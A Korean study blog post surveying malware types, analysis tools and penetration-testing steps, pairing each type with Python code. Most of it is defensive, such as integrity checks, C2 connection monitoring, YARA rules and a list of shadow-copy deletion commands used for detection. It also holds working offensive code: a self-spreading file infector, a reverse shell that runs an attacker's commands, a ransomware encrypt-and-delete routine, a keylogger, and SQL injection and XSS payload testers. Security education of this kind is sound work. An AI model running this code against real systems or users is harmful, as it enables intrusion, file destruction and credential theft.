---
title: 악성코드 종류 및 분석
published: 2026-06-04
description: '악성코드의 주요 종류와 동작 원리, 탐지 방법, 공부법과 모의해킹 방법론을 코드와 함께 정리합니다.'
image: ''
tags: ['보안', '악성코드', '분석', '랜섬웨어', '키로거', '모의해킹', '공부법']
category: '악성코드'
draft: false 
lang: ''
---

# 악성코드 종류 및 분석

> 악성코드(Malware)는 Malicious Software의 줄임말로, 사용자 몰래 시스템에 침투하여 정보를 훔치거나 파일을 암호화하는 등 피해를 주는 모든 악의적 소프트웨어를 말한다. 이 글에서는 주요 악성코드 유형과 동작 원리를 코드와 함께 정리한다.

---

## 왜 공부했는가

사실 처음엔 그냥 뉴스 보다가 시작됐다. SKT 유심 해킹 터졌을 때 다들 난리였는데, 나는 "BPFDoor가 뭔데?" 수준이었다. 보안 관련 글 찾아 읽으면 랜섬웨어, 인포스틸러, C2 서버 이런 단어가 막 나오는데 그게 뭔지도 모르고 그냥 읽고 있는 내 자신이 좀 웃겼다.

그리고 솔직히 해킹이라는 게 어떻게 이루어지는지 궁금하기도 했다. 드라마에서 보면 막 터미널 엄청 빠르게 치고 "침투했습니다" 하는데 실제론 어떤 건지. 그래서 그냥 찾아보기 시작했다.

## 어떻게 공부했는가

처음엔 뭘 검색해야 할지도 몰랐다. 그냥 "악성코드 공부법"이라고 검색했다가 FlareVM이라는 걸 알게 됐고, 가상머신 설치하는 것부터 막혀서 한참 걸렸다. VirtualBox 설치하고 세팅하다가 네트워크 설정 잘못해서 호스트 PC랑 같이 인터넷이 안 된 적도 있었다.

유튜브 보고, 블로그 보고, 막히면 또 검색하고 이런 식으로 했다. 체계적으로 했다기보다는 궁금한 거 생기면 파고드는 방식. 랜섬웨어 공부하다가 암호화 개념이 이해 안 되면 암호화 먼저 찾아보고, 그러다 보면 또 다른 게 나오고. 옆길로 많이 샜다.

Any.run 같은 온라인 샌드박스에서 실제 악성코드 행위 보는 게 제일 신기하고 재밌었다. 파일 하나 올리면 프로세스 뭐 만들고 레지스트리 어디 건드리고 어디로 통신하는지 다 보이니까. 책으로 읽을 때랑 느낌이 완전 달랐다.

---

## 악성코드 분류 한눈에 보기

| 종류 | 핵심 동작 | 자기 복제 | 숙주 필요 | 주요 목적 |
|------|-----------|-----------|-----------|-----------|
| 바이러스 | 파일에 붙어 전파 | ✓ | ✓ | 파괴·전파 |
| 웜 | 네트워크 자동 전파 | ✓ | ✗ | 전파·DDoS |
| 트로이목마 | 정상 프로그램으로 위장 | ✗ | ✗ | 백도어·정보탈취 |
| 랜섬웨어 | 파일 암호화 후 협박 | ✗ | ✗ | 금전 갈취 |
| 키로거 | 키 입력 기록 | ✗ | ✗ | 자격증명 탈취 |
| 인포스틸러 | 브라우저·앱 정보 수집 | ✗ | ✗ | 자격증명 탈취 |
| 루트킷 | 시스템 깊숙이 숨음 | ✗ | ✗ | 탐지 회피·은닉 |
| 봇넷 | 감염 PC 원격 제어망 구성 | ✓ | ✗ | DDoS·스팸 발송 |
| 스파이웨어 | 사용자 행동 몰래 수집 | ✗ | ✗ | 정보 수집 |
| 애드웨어 | 광고 강제 노출 | ✗ | ✗ | 광고 수익 |

---

## 1. 바이러스 (Virus)

### 개념

바이러스는 정상 실행 파일(`.exe`, `.docm` 등)에 자신의 코드를 삽입하여, 해당 파일이 실행될 때 함께 실행되는 악성코드다. 감염된 파일을 다른 사람에게 전달하면서 전파된다.

### 동작 방식

```
정상 파일 실행
    └→ 바이러스 코드 먼저 실행
           └→ 다른 실행 파일에 자신을 복사·삽입
                  └→ 원래 프로그램 정상 실행 (탐지 회피)
```

### 동작 방식 코드 (교육용)

```python
# 바이러스의 파일 감염 동작 원리 — 교육 목적
import os

VIRUS_SIGNATURE = "# [INFECTED]"  # 이미 감염됐는지 확인하는 마커

def is_infected(filepath: str) -> bool:
    with open(filepath, "r", errors="ignore") as f:
        return VIRUS_SIGNATURE in f.read()

def infect(filepath: str):
    """대상 파일 맨 앞에 바이러스 코드를 삽입한다."""
    if is_infected(filepath):
        return  # 이미 감염 — 중복 삽입 방지

    with open(filepath, "r") as f:
        original = f.read()

    virus_code = f"{VIRUS_SIGNATURE}\n# (바이러스 페이로드 실행)\n\n"

    with open(filepath, "w") as f:
        f.write(virus_code + original)

    print(f"[감염] {filepath}")

def spread():
    """현재 디렉터리의 .py 파일에 자신을 삽입한다."""
    for filename in os.listdir("."):
        if filename.endswith(".py") and filename != os.path.basename(__file__):
            infect(filename)

spread()
```

실제 바이러스는 Python이 아닌 실행 파일(`.exe`) 수준에서 PE 포맷의 코드 섹션에 직접 삽입하지만, 원리는 동일하다 — **실행 시 자신을 퍼뜨리고, 원래 코드도 정상 실행해 탐지를 늦춘다.**

### 코드 예시 — 파일 감염 탐지 (방어 관점)

실제 바이러스는 PE 파일의 섹션에 코드를 삽입한다. 아래는 파일 변조 여부를 해시로 검사하는 방어 코드다.

```python
import hashlib
import os

def get_file_hash(filepath: str) -> str:
    """파일의 SHA-256 해시를 계산한다."""
    sha256 = hashlib.sha256()
    with open(filepath, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            sha256.update(chunk)
    return sha256.hexdigest()

def check_integrity(filepath: str, known_hash: str) -> bool:
    """파일이 원본과 동일한지 확인한다."""
    current_hash = get_file_hash(filepath)
    if current_hash != known_hash:
        print(f"[경고] {filepath} 파일이 변조되었습니다!")
        print(f"  원본 해시: {known_hash}")
        print(f"  현재 해시: {current_hash}")
        return False
    return True

# 사용 예시
original_hash = get_file_hash("target.exe")
print(f"원본 해시 저장: {original_hash}")

# 나중에 무결성 검사
check_integrity("target.exe", original_hash)
```

### 탐지 및 방어

- **해시 기반 무결성 검사** — 실행 파일의 해시값을 주기적으로 비교
- **코드 서명 검증** — 신뢰된 서명이 없는 파일 실행 차단
- **안티바이러스 시그니처** — 알려진 바이러스 패턴(시그니처) 매칭

---

## 2. 웜 (Worm)

### 개념

웜은 숙주 파일 없이 **네트워크를 통해 스스로 전파**하는 악성코드다. 취약한 포트를 스캔하고 자동으로 공격하여 다른 시스템을 감염시킨다. 2003년 SQL Slammer, 2017년 WannaCry가 대표적이다.

### 동작 방식

```
감염 PC
    └→ 네트워크 IP 범위 스캔 (예: 445/tcp, SMB)
           └→ 취약점 발견 시 자동 공격·침투
                  └→ 자신을 복사하여 실행
                         └→ 다시 스캔 반복
```

### 동작 방식 코드 (교육용)

```python
# 웜의 자기 복제 및 전파 원리 — 교육 목적
import os
import shutil
import socket

def get_local_ip() -> str:
    """자신의 로컬 IP를 확인한다."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    ip = s.getsockname()[0]
    s.close()
    return ip

def replicate_self(target_path: str):
    """자신을 대상 경로에 복사한다."""
    self_path = os.path.abspath(__file__)
    shutil.copy2(self_path, target_path)
    print(f"[복제] {self_path} → {target_path}")

def worm_lifecycle(target_ip: str):
    """
    웜의 전파 흐름을 설명한다.
    실제 웜은 취약점 익스플로잇까지 자동화한다.
    """
    print(f"[1단계] {target_ip} 포트 스캔 → 취약 서비스 발견")
    print(f"[2단계] 취약점 익스플로잇 → 원격 쉘 획득")
    print(f"[3단계] 자신({os.path.abspath(__file__)})을 {target_ip}로 복사")
    print(f"[4단계] {target_ip}에서 자신을 실행")
    print(f"[5단계] {target_ip}에서 다시 1단계 반복 → 기하급수적 확산")

worm_lifecycle("192.168.1.50")
```

### 코드 예시 — 네트워크 포트 스캔 (탐지 관점)

웜이 사용하는 스캔 패턴을 이해하면 탐지에 도움이 된다.

```python
import socket
import ipaddress
from concurrent.futures import ThreadPoolExecutor

def check_port(ip: str, port: int, timeout: float = 0.5) -> bool:
    """특정 IP·포트가 열려 있는지 확인한다."""
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False

def scan_subnet(subnet: str, port: int):
    """서브넷 내 열린 포트를 스캔한다."""
    network = ipaddress.ip_network(subnet, strict=False)
    open_hosts = []

    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {
            executor.submit(check_port, str(ip), port): str(ip)
            for ip in network.hosts()
        }
        for future, ip in futures.items():
            if future.result():
                open_hosts.append(ip)
                print(f"[열린 포트 발견] {ip}:{port}")

    return open_hosts

# 사용 예시 (내부 네트워크 점검용)
# scan_subnet("192.168.1.0/24", 445)
```

> **주의:** 위 코드는 자신이 소유하거나 명시적 허가를 받은 네트워크에서만 사용해야 한다. 무단 스캔은 불법이다.

### 탐지 및 방어

- **방화벽으로 불필요한 포트 차단** — SMB(445), RDP(3389) 등 외부 노출 최소화
- **네트워크 이상 트래픽 탐지** — 단시간 대량 스캔 패턴 감지 (IDS/IPS)
- **OS·소프트웨어 패치** — 웜이 악용하는 취약점을 신속히 패치

---

## 3. 트로이목마 (Trojan Horse)

### 개념

정상 프로그램처럼 위장하여 사용자가 직접 실행하도록 유도하는 악성코드다. 실행 후 백도어를 열거나, RAT(원격 접근 도구)를 설치하여 공격자가 시스템을 원격으로 제어한다.

### 동작 방식

```
사용자: "무료 게임 설치파일 다운로드"
    └→ 실행 시 겉으로는 게임 설치
           └→ 뒤에서 C2 서버에 연결
                  └→ 공격자가 원격으로 명령 전달
                         └→ 파일 탈취, 화면 캡처, 추가 악성코드 설치
```

### 코드 예시 — 역방향 셸 개념 (C2 통신 원리)

트로이목마는 보통 **역방향 연결(Reverse Shell)** 을 사용한다. 피해자 PC가 공격자 서버에 먼저 연결하므로, 방화벽의 인바운드 차단을 우회한다.

```python
# [피해자 측 동작 개념] — 교육 목적
import socket
import subprocess

def reverse_shell_concept(attacker_ip: str, attacker_port: int):
    """
    역방향 셸 동작 원리 설명용 코드.
    실제 공격에 사용 금지.
    """
    # 공격자 서버에 먼저 연결 (인바운드 방화벽 우회)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))

    while True:
        # 명령 수신
        command = s.recv(1024).decode()
        if command.lower() == "exit":
            break

        # 명령 실행 및 결과 전송
        result = subprocess.run(
            command, shell=True, capture_output=True, text=True
        )
        output = result.stdout + result.stderr
        s.send(output.encode())

    s.close()
```

```python
# [방어 측 — C2 트래픽 탐지 예시]
import psutil

def detect_suspicious_connections(suspicious_ports: list[int]):
    """비정상 외부 연결을 탐지한다."""
    for conn in psutil.net_connections(kind="inet"):
        if conn.status == "ESTABLISHED" and conn.raddr:
            remote_ip, remote_port = conn.raddr
            # 알 수 없는 외부 IP로의 비정상 포트 연결 탐지
            if remote_port in suspicious_ports:
                pid = conn.pid
                try:
                    proc = psutil.Process(pid)
                    print(f"[의심 연결] PID={pid} ({proc.name()})")
                    print(f"  → {remote_ip}:{remote_port}")
                except psutil.NoSuchProcess:
                    pass

detect_suspicious_connections([4444, 1234, 31337])
```

### 탐지 및 방어

- **애플리케이션 화이트리스트** — 승인된 프로그램만 실행 허용
- **아웃바운드 방화벽 규칙** — 알 수 없는 외부 IP로의 연결 차단
- **EDR(엔드포인트 탐지·대응)** — 프로세스의 비정상 네트워크 연결 탐지

---

## 4. 랜섬웨어 (Ransomware)

### 개념

피해자의 파일을 암호화하고 복호화 키를 대가로 몸값(Ransom)을 요구하는 악성코드다. 2024년 Change Healthcare 사건에서 단일 공격으로 33억 달러 피해를 낳았을 만큼 가장 파괴적인 유형이다.

### 동작 방식

```
침투 (피싱·취약점 악용)
    └→ 내부 확산 및 데이터 유출 (이중 갈취 준비)
           └→ 볼륨 쉐도우 복사본 삭제 (백업 무력화)
                  └→ 파일 암호화 (AES-256 + RSA-2048)
                         └→ 랜섬노트 생성
                                └→ 몸값 요구
```

### 코드 예시 — 파일 암호화·복호화 원리

```python
from cryptography.fernet import Fernet
import os

# ── 키 생성 (실제 랜섬웨어는 이 키를 공격자 서버에 전송) ──
def generate_key() -> bytes:
    return Fernet.generate_key()

# ── 파일 암호화 ──
def encrypt_file(filepath: str, key: bytes):
    fernet = Fernet(key)
    with open(filepath, "rb") as f:
        original = f.read()
    encrypted = fernet.encrypt(original)
    with open(filepath + ".locked", "wb") as f:
        f.write(encrypted)
    os.remove(filepath)
    print(f"[암호화] {filepath} → {filepath}.locked")

# ── 파일 복호화 ──
def decrypt_file(filepath: str, key: bytes):
    fernet = Fernet(key)
    with open(filepath, "rb") as f:
        encrypted = f.read()
    decrypted = fernet.decrypt(encrypted)
    original_path = filepath.replace(".locked", "")
    with open(original_path, "wb") as f:
        f.write(decrypted)
    os.remove(filepath)
    print(f"[복호화] {filepath} → {original_path}")

# ── 사용 예시 ──
key = generate_key()
print(f"암호화 키: {key.decode()}")

# 테스트 파일 생성
with open("test.txt", "w") as f:
    f.write("중요한 문서 내용입니다.")

encrypt_file("test.txt", key)   # test.txt → test.txt.locked
decrypt_file("test.txt.locked", key)  # 복원
```

### 볼륨 쉐도우 복사본 삭제 탐지

랜섬웨어는 Windows 백업(VSS)을 먼저 삭제한다. 이 명령 실행을 탐지하면 초기에 차단할 수 있다.

```python
import subprocess

RANSOMWARE_COMMANDS = [
    "vssadmin delete shadows",
    "wmic shadowcopy delete",
    "bcdedit /set {default} recoveryenabled no",
    "wbadmin delete catalog",
]

def monitor_dangerous_commands(command: str) -> bool:
    """랜섬웨어가 주로 실행하는 명령어인지 확인한다."""
    for pattern in RANSOMWARE_COMMANDS:
        if pattern.lower() in command.lower():
            print(f"[위험] 랜섬웨어 의심 명령어 탐지: {command}")
            return True
    return False

# 예시
test_cmd = "vssadmin delete shadows /all /quiet"
monitor_dangerous_commands(test_cmd)
```

### 탐지 및 방어

- **3-2-1 백업 원칙** — 3개 복사본, 2개 미디어, 1개 오프라인(에어갭) 보관
- **볼륨 쉐도우 보호** — VSS 명령 실행을 모니터링하고 차단
- **최소 권한 원칙** — 일반 사용자 계정은 시스템 전체 암호화 권한 없도록 설정
- **MFA 필수 적용** — Change Healthcare처럼 원격 접속 자격증명만으로 침투하는 시나리오 차단

---

## 5. 키로거 (Keylogger)

### 개념

사용자의 키 입력을 몰래 기록하여 비밀번호·신용카드 번호·메시지 등을 탈취하는 악성코드다. 하드웨어 키로거(키보드와 PC 사이에 장치 삽입)와 소프트웨어 키로거로 나뉜다.

### 코드 예시 — 소프트웨어 키로거 원리

```python
# pynput 라이브러리 기반 키 입력 감지 예시 (교육용)
from pynput import keyboard
import datetime

LOG_FILE = "keylog.txt"

def on_press(key):
    """키 입력 이벤트 처리."""
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        char = key.char  # 일반 문자키
    except AttributeError:
        char = f"[{key}]"  # 특수키 (Enter, Shift 등)

    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"{timestamp} | {char}\n")

def start_keylogger():
    print("키로거 시작 (Esc로 종료)")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# start_keylogger()
```

로그 파일 예시:
```
2026-06-04 14:32:01 | p
2026-06-04 14:32:01 | a
2026-06-04 14:32:02 | s
2026-06-04 14:32:02 | s
2026-06-04 14:32:02 | w
2026-06-04 14:32:02 | o
2026-06-04 14:32:03 | r
2026-06-04 14:32:03 | d
2026-06-04 14:32:03 | [Key.enter]
```

### 탐지 및 방어

- **가상 키보드 사용** — 금융 사이트 등에서 마우스로 클릭하는 가상 키보드 활용
- **안티키로거 솔루션** — 키보드 훅 프로세스를 탐지하여 차단
- **프로세스 모니터링** — `keyboard.Listener` 같은 훅을 등록한 프로세스 감시

---

## 6. 인포스틸러 (Infostealer)

### 개념

브라우저에 저장된 비밀번호, 쿠키, 자동완성 데이터, 암호화폐 지갑, FTP 자격증명 등을 수집하는 악성코드다. Lumma, Raccoon, RedLine이 대표적이며, 2024년 Snowflake 침해 사건처럼 탈취된 자격증명이 대규모 2차 공격에 활용된다.

### 코드 예시 — Chrome 저장 비밀번호 위치 파악 (방어 관점)

인포스틸러가 어디서 데이터를 수집하는지 알면 방어에 도움이 된다.

```python
import os
import platform

def get_browser_profile_paths() -> dict:
    """
    주요 브라우저의 자격증명 저장 경로를 반환한다.
    인포스틸러가 주로 탐색하는 경로다.
    """
    system = platform.system()
    paths = {}

    if system == "Windows":
        appdata = os.environ.get("LOCALAPPDATA", "")
        roaming = os.environ.get("APPDATA", "")
        paths = {
            "Chrome":  os.path.join(appdata, "Google", "Chrome", "User Data", "Default", "Login Data"),
            "Edge":    os.path.join(appdata, "Microsoft", "Edge", "User Data", "Default", "Login Data"),
            "Firefox": os.path.join(roaming, "Mozilla", "Firefox", "Profiles"),
        }
    elif system == "Darwin":  # macOS
        home = os.path.expanduser("~")
        paths = {
            "Chrome":  os.path.join(home, "Library", "Application Support", "Google", "Chrome", "Default", "Login Data"),
            "Safari":  os.path.join(home, "Library", "Safari", "Logins.plist"),
        }

    for browser, path in paths.items():
        exists = "존재" if os.path.exists(path) else "없음"
        print(f"[{browser}] {path} → {exists}")

    return paths

get_browser_profile_paths()
```

### 탐지 및 방어

- **브라우저 비밀번호 저장 사용 중단** — 전용 비밀번호 관리자(1Password, Bitwarden 등) 사용
- **자격증명 유출 모니터링** — HaveIBeenPwned, SpyCloud로 자신의 계정 유출 여부 확인
- **MFA 적용** — 자격증명이 탈취되어도 2차 인증으로 계정 보호

---

## 7. 루트킷 (Rootkit)

### 개념

운영체제의 핵심(커널)에 숨어 자신과 다른 악성코드의 존재를 감추는 악성코드다. 프로세스 목록, 파일 목록, 네트워크 연결 목록에서 자신을 숨겨 탐지를 극도로 어렵게 만든다.

### 동작 방식 — API 후킹

```
일반 프로그램이 "프로세스 목록 조회" 요청
    └→ 루트킷이 Windows API를 가로챔 (후킹)
           └→ 악성 프로세스를 목록에서 제거
                  └→ 변조된 결과를 프로그램에 반환
                         └→ 탐지 도구에 악성 프로세스가 보이지 않음
```

### 코드 예시 — 프로세스 숨김 탐지

```python
import psutil
import subprocess

def compare_process_lists() -> list:
    """
    psutil과 OS 명령어의 프로세스 목록을 비교하여
    루트킷에 의해 숨겨진 프로세스를 탐지한다.
    """
    # psutil로 수집한 PID 목록
    psutil_pids = set(psutil.pids())

    # OS 명령어로 수집한 PID 목록 (Windows: tasklist / Linux: ps)
    result = subprocess.run(
        ["tasklist", "/fo", "csv", "/nh"],
        capture_output=True, text=True
    )
    os_pids = set()
    for line in result.stdout.strip().split("\n"):
        parts = line.strip('"').split('","')
        if len(parts) > 1:
            try:
                os_pids.add(int(parts[1]))
            except ValueError:
                pass

    # 두 목록의 차이 = 루트킷에 의해 숨겨졌을 가능성
    hidden = psutil_pids - os_pids
    if hidden:
        print(f"[경고] 숨겨진 프로세스 의심: PID {hidden}")
    else:
        print("[정상] 두 목록이 일치합니다.")

    return list(hidden)
```

### 탐지 및 방어

- **부팅 전 스캔** — OS 부팅 전 외부 미디어로 스캔 (루트킷이 로드되기 전)
- **커널 무결성 검증** — Windows Secure Boot, Kernel Patch Protection
- **하이퍼바이저 기반 탐지** — VM 위에서 게스트 OS 메모리를 외부에서 분석

---

## 8. 봇넷 (Botnet)

### 개념

악성코드에 감염된 수많은 PC(봇, Bot)를 하나의 네트워크로 묶어 공격자가 원격으로 제어하는 시스템이다. DDoS 공격, 스팸 발송, 암호화폐 채굴 등에 활용된다.

### 구조

```
공격자 (C2 서버 운영)
    └→ C2 서버 (Command & Control)
           ├→ 봇 #1 (감염된 일반 PC)
           ├→ 봇 #2
           ├→ 봇 #3
           └→ 봇 #N  ← 수만~수백만 대
                  └→ 일제히 명령 수행 (DDoS, 스팸 등)
```

### 코드 예시 — DDoS 트래픽 탐지

```python
import collections
import time

# 간단한 요청 속도 기반 DDoS 탐지 시뮬레이션
class DDoSDetector:
    def __init__(self, threshold: int = 100, window: int = 10):
        self.threshold = threshold  # 허용 요청 수
        self.window = window        # 시간 창 (초)
        self.request_log: dict = collections.defaultdict(list)

    def record_request(self, ip: str):
        now = time.time()
        # 오래된 기록 제거
        self.request_log[ip] = [
            t for t in self.request_log[ip] if now - t < self.window
        ]
        self.request_log[ip].append(now)

        count = len(self.request_log[ip])
        if count > self.threshold:
            print(f"[DDoS 의심] {ip} → {self.window}초 내 {count}회 요청")
            return True
        return False

detector = DDoSDetector(threshold=10, window=5)

# 시뮬레이션: 특정 IP가 짧은 시간에 대량 요청
for _ in range(15):
    detector.record_request("192.168.1.100")
    time.sleep(0.1)
```

---

## 악성코드 분석 방법

### 정적 분석 (Static Analysis)

악성코드를 **실행하지 않고** 분석하는 방법이다.

```bash
# 파일 해시 확인
sha256sum malware.exe

# 문자열 추출 (하드코딩된 IP, URL, 함수명 확인)
strings malware.exe | grep -E "(http|\.exe|cmd|powershell)"

# PE 파일 구조 분석
pe-bear malware.exe

# YARA 룰로 악성코드 패턴 매칭
yara rules/malware_rules.yar malware.exe
```

**YARA 룰 예시** — 랜섬웨어 탐지 룰:

```yara
rule Ransomware_Generic {
    meta:
        description = "일반적인 랜섬웨어 패턴 탐지"
        author      = "security-team"

    strings:
        $vss1 = "vssadmin delete shadows" nocase
        $vss2 = "wmic shadowcopy delete"  nocase
        $ext1 = ".locked"
        $ext2 = ".encrypted"
        $note = "YOUR FILES HAVE BEEN ENCRYPTED" nocase

    condition:
        any of ($vss*) or (any of ($ext*) and $note)
}
```

### 동적 분석 (Dynamic Analysis)

악성코드를 **격리된 환경(샌드박스)에서 실제 실행**하여 동작을 관찰하는 방법이다.

```bash
# 프로세스 모니터링 (Process Monitor, Windows)
procmon.exe /Quiet /Minimized /BackingFile capture.pml

# 네트워크 트래픽 캡처
wireshark -i eth0 -w malware_traffic.pcap

# 자동 샌드박스 분석 (Cuckoo Sandbox)
cuckoo submit malware.exe
```

| 도구 | 용도 |
|------|------|
| VirusTotal | 다중 AV 엔진으로 파일 스캔 |
| Any.run | 온라인 대화형 샌드박스 |
| Cuckoo Sandbox | 오픈소스 자동 분석 환경 |
| Ghidra / IDA Pro | 역공학(디스어셈블·디컴파일) |
| Wireshark | 네트워크 트래픽 캡처·분석 |
| Process Monitor | 파일·레지스트리·프로세스 행위 추적 |

---

## 종합 방어 전략

```
예방 (Prevention)
├─ 소프트웨어 최신 패치 유지
├─ 모든 원격 접속에 MFA 적용
├─ 최소 권한 원칙 (PoLP)
└─ 사용자 보안 인식 교육

탐지 (Detection)
├─ 안티바이러스·EDR 운영
├─ SIEM으로 로그 중앙 수집·분석
├─ 네트워크 이상 트래픽 모니터링 (IDS/IPS)
└─ 자격증명 유출 모니터링

대응 (Response)
├─ 인시던트 대응 플레이북 사전 수립
├─ 감염 시스템 즉시 네트워크 격리
└─ 3-2-1 백업으로 빠른 복구

복구 (Recovery)
├─ 에어갭 백업에서 데이터 복원
├─ 루트 원인 분석 후 재발 방지
└─ 사고 보고서 작성 및 공유
```

---

## 악성코드 공부법

### 1단계 — 실습 환경 구축

악성코드는 반드시 **격리된 가상 환경**에서 다뤄야 한다. 실수로 호스트 PC가 감염되거나 네트워크로 확산되는 것을 막기 위해서다.

```
권장 환경 구성

호스트 PC
└→ VMware / VirtualBox (가상머신)
       ├→ FlareVM (Windows) — 악성코드 분석 전용 도구 패키지
       │       Ghidra, IDA Free, x64dbg, PEiD, Process Monitor 등 포함
       └→ REMnux (Linux) — 네트워크·스크립트 기반 악성코드 분석
               Wireshark, Volatility, YARA, oledump 등 포함
```

```bash
# FlareVM 설치 (Windows VM에서 실행)
# https://github.com/mandiant/flare-vm

Set-ExecutionPolicy Unrestricted -Scope CurrentUser
iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/mandiant/flare-vm/main/install.ps1'))
```

> **중요:** 가상머신의 네트워크를 **호스트 전용(Host-Only)** 또는 **격리(Isolated)** 모드로 설정해 외부 인터넷 연결을 차단한다.

### 2단계 — 학습 로드맵

```
기초
├─ C / Python 프로그래밍 기초
├─ 운영체제 구조 (Windows PE 포맷, 프로세스·메모리 관리)
└─ 네트워크 기초 (TCP/IP, DNS, HTTP)

중급
├─ 어셈블리어 기초 (x86/x64)
├─ 정적 분석 — Ghidra, IDA Free로 역공학
├─ 동적 분석 — x64dbg로 디버깅, Process Monitor로 행위 추적
└─ YARA 룰 작성

고급
├─ 커널 레벨 분석 (루트킷, 드라이버)
├─ 메모리 포렌식 (Volatility)
└─ 악성코드 직접 제작 (합법적 연구 환경에서)
```

### 3단계 — 추천 실습 플랫폼

| 플랫폼 | 특징 | 난이도 |
|--------|------|--------|
| [Any.run](https://any.run) | 온라인 대화형 샌드박스, 실시간 분석 | 초급 |
| [MalwareBazaar](https://bazaar.abuse.ch) | 실제 악성코드 샘플 무료 다운로드 | 중급 |
| [Malware Traffic Analysis](https://malware-traffic-analysis.net) | 실제 악성 트래픽 PCAP 파일 제공 | 중급 |
| [VirusTotal](https://virustotal.com) | 다중 AV 스캔 + 행위 분석 | 초급 |
| [Reverse.it](https://www.hybrid-analysis.com) | 무료 샌드박스 분석 | 초급 |

### 4단계 — 추천 학습 자료

**무료**
- **Malware Unicorn 워크숍** — 실습 기반 악성코드 분석 교육 (무료 공개)
- **OpenSecurityTraining2** — 어셈블리·역공학 강의
- **MITRE ATT&CK** — 실제 공격자 전술·기법 데이터베이스

**책**
- *Practical Malware Analysis* (Sikorski & Honig) — 악성코드 분석 바이블
- *The Art of Memory Forensics* — 메모리 포렌식 심화

**CTF (실전 훈련)**
- [picoCTF](https://picoctf.org) — 입문자 친화적
- [pwnable.kr](http://pwnable.kr) — 시스템 해킹 실습
- [reversing.kr](http://reversing.kr) — 리버싱 전문

---

## 모의해킹(Penetration Testing) 방법론

> **반드시 먼저:** 해킹은 **명시적 서면 허가** 없이는 모두 불법이다. 아래 내용은 허가된 환경(CTF, 버그바운티, 모의해킹 계약)에서만 적용한다.

### 모의해킹 5단계

```
1. 정찰 (Reconnaissance)
   └─ 공개 정보 수집 (OSINT): Shodan, Google Dorking, WHOIS
   
2. 스캐닝 (Scanning)
   └─ 포트·서비스·취약점 스캔: Nmap, Nessus, Nikto

3. 취약점 분석 (Vulnerability Analysis)
   └─ 발견된 서비스의 알려진 취약점 파악: CVE, Exploit-DB

4. 익스플로잇 (Exploitation)
   └─ 취약점 실제 공격: Metasploit, Burp Suite, 직접 작성한 PoC

5. 보고 (Reporting)
   └─ 발견한 취약점·위험도·재현 방법·권고 사항 문서화
```

### 단계별 코드 예시

#### 1. 정찰 — Google Dorking

구글 검색 연산자를 활용해 노출된 민감 정보를 찾는 기법이다.

```
# 노출된 관리자 페이지 검색
site:target.com inurl:admin

# 설정 파일 노출 검색
site:target.com ext:env OR ext:config OR ext:xml

# 디렉터리 목록 노출
site:target.com intitle:"Index of"

# 특정 기술 스택 파악
site:target.com "Powered by WordPress"
```

#### 2. 스캐닝 — Nmap

```bash
# 기본 포트 스캔 (상위 1000개 포트)
nmap 192.168.1.1

# 전체 포트 + 서비스 버전 탐지
nmap -p- -sV 192.168.1.1

# OS 탐지 + 스크립트 실행
nmap -A 192.168.1.1

# 웹 취약점 스크립트 실행
nmap --script=http-vuln* -p 80,443 192.168.1.1

# 결과 파일로 저장
nmap -oN result.txt -oX result.xml 192.168.1.1
```

```python
# Python으로 Nmap 결과 파싱
import xml.etree.ElementTree as ET

def parse_nmap_xml(xml_file: str):
    """Nmap XML 결과에서 열린 포트·서비스를 추출한다."""
    tree = ET.parse(xml_file)
    root = tree.getroot()

    for host in root.findall("host"):
        ip = host.find("address").get("addr")
        print(f"\n[호스트] {ip}")

        for port in host.findall(".//port"):
            portid = port.get("portid")
            state  = port.find("state").get("state")
            service = port.find("service")
            name    = service.get("name", "unknown") if service is not None else "unknown"
            version = service.get("version", "") if service is not None else ""

            if state == "open":
                print(f"  {portid}/tcp  {name}  {version}")

# parse_nmap_xml("result.xml")
```

#### 3. 웹 취약점 — SQL Injection 탐지

```python
import requests

def test_sql_injection(url: str, param: str):
    """
    GET 파라미터에 SQL Injection 취약점이 있는지 테스트한다.
    허가된 대상에만 사용할 것.
    """
    payloads = [
        "'",           # 기본 싱글쿼트
        "' OR '1'='1", # 항상 참 조건
        "'; DROP TABLE users;--",  # 다중 구문
        "' UNION SELECT NULL--",   # UNION 기반
    ]
    error_signatures = [
        "SQL syntax", "mysql_fetch", "ORA-", "ODBC",
        "PostgreSQL", "SQLite", "Unclosed quotation"
    ]

    for payload in payloads:
        params = {param: payload}
        try:
            resp = requests.get(url, params=params, timeout=5)
            for sig in error_signatures:
                if sig.lower() in resp.text.lower():
                    print(f"[취약점 발견] 파라미터: {param}")
                    print(f"  페이로드: {payload}")
                    print(f"  오류 시그니처: {sig}")
                    return True
        except requests.RequestException as e:
            print(f"요청 실패: {e}")
    print("[정상] SQL Injection 취약점 미탐지")
    return False

# test_sql_injection("http://testphp.vulnweb.com/artists.php", "artist")
```

#### 4. 웹 취약점 — XSS 탐지

```python
import requests

def test_xss(url: str, param: str):
    """
    반사형 XSS 취약점을 테스트한다.
    허가된 대상에만 사용할 것.
    """
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "'><script>alert(1)</script>",
        "<svg onload=alert(1)>",
    ]

    for payload in payloads:
        params = {param: payload}
        try:
            resp = requests.get(url, params=params, timeout=5)
            # 페이로드가 응답에 그대로 반영되면 XSS 취약점
            if payload in resp.text:
                print(f"[반사형 XSS 취약점] 파라미터: {param}")
                print(f"  페이로드: {payload}")
                return True
        except requests.RequestException as e:
            print(f"요청 실패: {e}")
    print("[정상] 반사형 XSS 취약점 미탐지")
    return False
```

#### 5. 취약한 환경에서 실습 — DVWA

```bash
# DVWA (Damn Vulnerable Web Application) — 합법적 실습용 취약 앱
docker run --rm -it -p 80:80 vulnerables/web-dvwa

# WebGoat — OWASP 제공 실습 환경
docker run -it -p 8080:8080 -p 9090:9090 webgoat/goat-and-wolf

# Metasploitable — 취약한 리눅스 VM
# https://sourceforge.net/projects/metasploitable/
```

### 모의해킹 실습 플랫폼

